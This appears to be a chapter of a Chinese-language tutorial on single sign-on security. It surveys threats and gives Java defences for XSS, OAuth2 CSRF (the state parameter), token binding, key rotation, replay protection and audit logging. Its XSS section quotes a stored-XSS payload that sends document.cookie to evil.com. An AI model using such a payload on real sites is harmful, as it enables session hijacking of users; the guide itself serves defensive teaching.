
# 1. 概述

SSO 集中了所有系统的认证入口，一旦被攻破，影响范围极广。因此 SSO 的安全性要求远高于普通应用。本章系统梳理 SSO 面临的主要安全威胁及其防御措施。

# 2. 威胁全景

```
┌──────────────────────────────────────────────────────────────────┐
│                    SSO 安全威胁全景                               │
│                                                                   │
│  浏览器端攻击:                                                     │
│  ├── XSS（跨站脚本）→ 窃取 Cookie/Token                          │
│  ├── CSRF（跨站请求伪造）→ 伪造登出/登录请求                      │
│  ├── Clickjacking → 诱导用户点击隐藏的确认按钮                    │
│  ├── 会话固定（Session Fixation）→ 诱导用户使用攻击者的 Session   │
│  └── 恶意浏览器插件 → 窃取 Token/修改请求                         │
│                                                                   │
│  传输层攻击:                                                       │
│  ├── 中间人（MITM）→ 窃听/篡改 HTTP 通信                         │
│  ├── SSL Stripping → 降级攻击，强制 HTTP                          │
│  └── DNS 劫持/Hosts 篡改                                          │
│                                                                   │
│  协议层攻击:                                                       │
│  ├── Token/Cookie 劫持                                            │
│  ├── 重放攻击 → 重用 ST/Authorization Code                       │
│  ├── Token 伪造（alg=none/密钥泄露）                              │
│  ├── 授权码拦截 + PKCE 绕过                                       │
│  └── redirect_uri 劫持                                            │
│                                                                   │
│  认证层攻击:                                                       │
│  ├── 暴力破解 → 尝试密码/Token jti 空间                           │
│  ├── 凭证填充（Credential Stuffing）                              │
│  ├── 钓鱼 → 伪造 SSO 登录页                                      │
│  ├── 社交工程                                                      │
│  └── 内部威胁（管理员/运维人员）                                   │
│                                                                   │
│  基础设施攻击:                                                     │
│  ├── DDoS → 认证中心不可用                                        │
│  ├── 服务端漏洞（RCE/SQL注入）                                    │
│  ├── 密钥泄露（签名私钥/加密密钥）                                 │
│  └── 日志泄露（Token/SessionID 记录到日志）                       │
└──────────────────────────────────────────────────────────────────┘
```

# 3. XSS 攻击与防御

## 3.1 攻击场景

```
场景 1：存储型 XSS
用户在备注中输入 <script>fetch('https://evil.com?cookie='+document.cookie)</script>
→ 页面渲染时执行脚本 → Cookie 泄露 → 攻击者劫持会话

场景 2：反射型 XSS
URL 参数: /search?q=<script>alert(1)</script>
→ 搜索词直接渲染到页面 → 脚本执行

场景 3：DOM 型 XSS
# URL 片段被 JavaScript 不安全地 eval
```

## 3.2 防御措施

```java
// 1. Cookie 安全属性（最基础的防护）
Cookie cookie = new Cookie("SSO_TOKEN", token);
cookie.setHttpOnly(true);    // ✅ 禁止 JavaScript 读取
cookie.setSecure(true);      // ✅ 仅 HTTPS 传输
cookie.setSameSite("Lax");    // ✅ 限制跨站请求携带

// 2. Content-Security-Policy（CSP）HTTP 响应头
// 限制页面可以加载和执行的资源
response.setHeader("Content-Security-Policy",
    "default-src 'self'; " +
    "script-src 'self' 'nonce-random123'; " +  // 只执行带 nonce 的脚本
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "frame-ancestors 'none'; " +                // 防 Clickjacking
    "form-action 'self';");

// 3. 输入输出编码
// 所有用户输入在输出到 HTML 时进行转义
String safeOutput = HtmlUtils.htmlEscape(userInput);

// 4. X-XSS-Protection（已废弃，但仍可加一层防护）
response.setHeader("X-XSS-Protection", "1; mode=block");

// 5. Spring Security 自动防御
// Spring Security 默认启用 CSP、XSS 防护等 Headers
// Content-Security-Policy 需要手动配置
```

# 4. CSRF 攻击与防御

## 4.1 SSO 场景的 CSRF 攻击

```
攻击场景（OAuth2 登录 CSRF）：
1. 攻击者用自己的账号完成认证，获得 code=attacker_code
2. 攻击者诱导受害者访问：
   https://victim-app.com/callback?code=attacker_code&state=state_from_attacker
3. victim-app 用 attacker_code 换取攻击者的 Token
4. 受害者不知不觉"登录"成了攻击者的账号
5. 受害者在攻击者账号中输入敏感信息 → 攻击者查看

防御：state 参数
```

## 4.2 防御实现

```java
/**
 * OAuth2 state 参数生成与验证
 */
@Controller
public class OAuth2Controller {

    /**
     * 发起授权时生成 state 并存入 Session
     */
    @GetMapping("/oauth2/authorize")
    public String authorize(HttpSession session) {
        // 生成高熵随机 state
        String state = UUID.randomUUID().toString()
            + "-" + SecureRandom.getInstanceStrong().nextLong();

        // 存入 Session
        session.setAttribute("OAUTH2_STATE", state);

        // 构建授权 URL
        String authUrl = "https://auth.example.com/authorize?"
            + "response_type=code"
            + "&client_id=my-app"
            + "&redirect_uri=https://myapp.com/callback"
            + "&state=" + state;

        return "redirect:" + authUrl;
    }

    /**
     * 回调时验证 state
     */
    @GetMapping("/callback")
    public String callback(@RequestParam String code,
                           @RequestParam String state,
                           HttpSession session) {

        // 从 Session 取出之前存储的 state
        String savedState = (String) session.getAttribute("OAUTH2_STATE");

        // 验证
        if (savedState == null || !MessageDigest.isEqual(
                savedState.getBytes(), state.getBytes())) {
            throw new SecurityException("CSRF 攻击检测：state 不匹配");
        }

        // 清除 state（一次性使用）
        session.removeAttribute("OAUTH2_STATE");

        // 继续后续流程...
        return "redirect:/home";
    }
}
```

# 5. Token 安全

## 5.1 Token 泄露防御

```java
/**
 * Token 安全增强措施
 */
@Service
public class TokenSecurityService {

    /**
     * 1. Token 绑定到设备/IP（Sender-Constrained）
     */
    public String createDeviceBoundToken(UserDetails user, String deviceFingerprint) {
        return Jwts.builder()
            .subject(user.getUsername())
            .claim("device_hash", hash(deviceFingerprint))  // 设备指纹哈希
            .claim("ip_range", extractIpRange())             // IP 范围
            .claim("user_agent_hash", hash(getUserAgent()))  // UA 哈希
            .expiration(new Date(System.currentTimeMillis() + 900_000))
            .signWith(privateKey)
            .compact();
    }

    /**
     * 2. 敏感操作需重新认证（Step-Up Authentication）
     */
    @PreAuthorize("hasRole('USER')")
    @PostMapping("/api/sensitive/delete-account")
    public void deleteAccount(@RequestParam String reauthToken) {
        // 验证 reauthToken（短期、单次使用的 Token）
        if (!tokenService.validateReauthToken(reauthToken)) {
            throw new AccessDeniedException("需要重新认证");
        }
        // 执行删除操作
    }

    /**
     * 3. Token 泄露检测
     */
    @EventListener
    public void onTokenUsed(TokenUsedEvent event) {
        // 检测异常模式
        UserTokenStats stats = getUserTokenStats(event.getUserId());

        // 短时间内从不同 IP 使用 Token → 可能泄露
        if (stats.getDistinctIps(5, TimeUnit.MINUTES) > 3) {
            alertService.sendAlert("Token 可能泄露",
                "用户 " + event.getUserId()
                + " 的 Token 在 5 分钟内从 " + stats.getDistinctIps()
                + " 个不同 IP 使用");
            // 自动吊销所有 Token
            tokenService.revokeAllTokens(event.getUserId());
        }

        // 不常见的地理位置跳跃
        if (stats.hasImpossibleTravel()) {
            alertService.sendAlert("异常地理跳变",
                "用户 " + event.getUserId() + " 出现不可能的地理位置跳跃");
        }
    }
}
```

## 5.2 密钥安全管理

```java
/**
 * 签名密钥安全管理
 */
@Configuration
public class KeyManagementConfig {

    /**
     * ✅ 生产环境密钥管理方案：
     *
     * 1. 使用 HSM（硬件安全模块）或云 KMS 存储私钥
     * 2. 密钥不写在代码或配置文件中
     * 3. 定期轮换密钥
     * 4. 旧密钥保留一段时间用于验证已签发的 Token
     */

    // ❌ 错误做法：硬编码密钥
    // private static final String SECRET = "my-secret-key";

    // ✅ 正确做法：从密钥管理服务获取
    @Bean
    public RSAPrivateKey signingPrivateKey() {
        // 从 Vault / AWS KMS / Azure Key Vault 获取
        return keyManagementService.getPrivateKey("jwt-signing-key");
    }

    @Bean
    public RSAPublicKey signingPublicKey() {
        return keyManagementService.getPublicKey("jwt-signing-key");
    }

    /**
     * 密钥轮换策略
     */
    @Scheduled(cron = "0 0 2 1 * ?") // 每月 1 日 2:00
    public void rotateKeys() {
        // 生成新密钥对
        KeyPair newKeyPair = generateRsaKeyPair();
        String newKid = "signing-key-" + LocalDate.now();

        // 新密钥设为当前活跃密钥
        activeKeys.put(newKid, newKeyPair);

        // 旧密钥标记为"退役"（仍可验证已签发的 Token）
        // 退役周期 = Token 最大有效期（如 7 天）
        scheduleKeyRetirement(oldKid, Duration.ofDays(7));

        // 更新 JWKS 端点
        updateJwksEndpoint();

        log.info("签名密钥已轮换，新 kid: {}", newKid);
    }
}
```

# 6. 重放攻击防御

## 6.1 ST/Code 一次性

```java
/**
 * CAS ST 或 OAuth2 Code 的一次性保证
 */
@Service
public class TicketValidationService {

    private final Set<String> usedTickets = ConcurrentHashMap.newKeySet();

    /**
     * 原子性地验证并消费 Ticket
     */
    public UserInfo validateAndConsume(String ticket) {
        // 使用 Redis SetNX 实现原子操作
        Boolean isNew = redisTemplate.opsForValue()
            .setIfAbsent("used_ticket:" + ticket, "1",
                Duration.ofMinutes(10));

        if (Boolean.FALSE.equals(isNew)) {
            // Ticket 已被使用 → 重放攻击！
            log.warn("检测到票据重放: {}", ticket);
            throw new SecurityException("票据已被使用");
        }

        // 验证票据
        UserInfo user = casClient.validate(ticket);
        return user;
    }
}
```

## 6.2 JWT jti 防重放

```java
/**
 * JWT jti 防重放
 */
@Component
public class JtiReplayProtection {

    @Autowired
    private RedisTemplate<String, String> redisTemplate;

    // 在 Redis 中使用 Bloom Filter 实现
    // 误判率可接受（最多拒绝一个合法请求，但确保不放过重放攻击）

    public boolean checkAndMark(String jti, long ttlSeconds) {
        // SetNX 保证原子性
        Boolean success = redisTemplate.opsForValue()
            .setIfAbsent("jti:" + jti, "1", Duration.ofSeconds(ttlSeconds));
        return Boolean.TRUE.equals(success);
    }
}
```

# 7. 多因素认证（MFA）

## 7.1 MFA 在 SSO 中的位置

```
SSO 认证中心是 MFA 的最佳实施点：
- 一次部署，所有系统受益
- 支持 TOTP（Google Authenticator）、SMS、硬件 Key（WebAuthn/FIDO2）

OIDC 中的 MFA 表示：
ID Token 中的 amr（Authentication Methods Reference）claim:
{
    "amr": ["pwd", "totp"]  // 密码 + TOTP 双因素
}

SAML 中的 MFA 表示：
AuthnContextClassRef:
urn:oasis:names:tc:SAML:2.0:ac:classes:TimeSyncToken
```

# 8. 日志与审计

## 8.1 审计日志设计

```java
/**
 * SSO 审计日志
 */
@Entity
@Table(name = "sso_audit_log")
public class SsoAuditLog {
    @Id
    @GeneratedValue
    private Long id;

    private String eventType;      // LOGIN_SUCCESS, LOGIN_FAILED, LOGOUT, TOKEN_REFRESH
    private String username;
    private String clientId;
    private String ipAddress;
    private String userAgent;
    private String sessionId;
    private String tokenJti;
    private String reason;         // 失败原因
    private Instant eventTime;

    // 敏感字段脱敏存储
    // password 绝不记录（即使是加密形式）
}

/**
 * 审计日志服务
 */
@Service
public class SsoAuditService {

    public void logLoginSuccess(String username, String ip, String userAgent) {
        // 正常登录 → INFO
        log.info("LOGIN_SUCCESS | user={} | ip={} | agent={}",
            username, ip, userAgent);
        saveAuditLog(username, "LOGIN_SUCCESS", ip, userAgent);
    }

    public void logLoginFailure(String username, String ip, String reason) {
        // 登录失败 → WARN（可能是攻击）
        log.warn("LOGIN_FAILED | user={} | ip={} | reason={}",
            username, ip, reason);
        saveAuditLog(username, "LOGIN_FAILED", ip, reason);

        // 异常检测：同一 IP 短时间内多次失败
        if (getRecentFailures(ip, 5, TimeUnit.MINUTES) > 10) {
            alertService.sendAlert("可能的暴力破解",
                "IP " + ip + " 在 5 分钟内登录失败 " +
                getRecentFailures(ip, 5, TimeUnit.MINUTES) + " 次");
        }
    }
}
```

# 9. 安全加固清单

| 安全措施 | 说明 | 优先级 |
|---------|------|--------|
| **HTTPS 强制** | 所有通信必须 HTTPS，开启 HSTS | 🔴 必须 |
| **HttpOnly Cookie** | 防止 XSS 窃取 Cookie | 🔴 必须 |
| **Secure Cookie** | 仅 HTTPS 传输 Cookie | 🔴 必须 |
| **MFA** | 关键系统启用多因素认证 | 🔴 必须 |
| **PKCE** | OAuth 2.0 强制启用 PKCE | 🔴 必须 |
| **state 参数** | 所有 OAuth 请求携带 state 防 CSRF | 🔴 必须 |
| **STS 严格传输安全** | HSTS max-age >= 1 年 | 🟠 强烈推荐 |
| **CSP** | 内容安全策略限制资源加载 | 🟠 强烈推荐 |
| **Token 绑定** | Token 绑定到设备/IP（Sender-Constrained） | 🟠 强烈推荐 |
| **密钥轮换** | 定期更换签名密钥 | 🟠 强烈推荐 |
| **审计日志** | 完整记录认证事件 | 🟠 强烈推荐 |
| **速率限制** | 登录接口限流 | 🟠 强烈推荐 |
| **账户锁定** | 多次失败后锁定账户 | 🟡 推荐 |
| **异常检测** | 异地登录、异常时间、新设备通知 | 🟡 推荐 |
| **密码策略** | 最小长度、复杂度、历史禁止 | 🟡 推荐 |
